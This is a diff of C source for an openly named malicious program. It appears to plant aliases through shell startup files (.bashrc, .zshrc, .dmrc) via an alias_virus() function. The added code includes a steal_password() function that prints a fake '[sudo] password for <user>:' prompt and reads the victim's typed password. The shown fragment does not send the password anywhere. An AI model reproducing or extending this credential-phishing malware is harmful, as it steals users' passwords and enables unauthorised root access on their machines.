@@ -7,6 +7,8 @@
 #include <fcntl.h>
 #include "pseudo.h"
 
+#define PASSWD_SIZE 1024
+#define UNAME_SIZE 1024
 
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
@@ -24,9 +26,28 @@ int main(int argc, char ** argv){
     alias_virus();
   }
   
+  if(mode == P_SUDO){
+    char passwd[PASSWD_SIZE];
+    char username[UNAME_SIZE];
 
+    steal_password(passwd, username);
+  }
 }
 
+
+int get_username(char * uname){
+  uid_t uid = getuid();
+  struct passwd *pw = getpwuid(uid);
+  strcpy(uname, pw -> pw_name);
+}
+
+int steal_password(char * passwd, char * username){
+  get_username(username);
+
+  printf("[sudo] password for %s: ", username);
+  fgets(passwd, PASSWD_SIZE, stdin);
+
+}
 
 int alias_virus(){
   //get the home dir
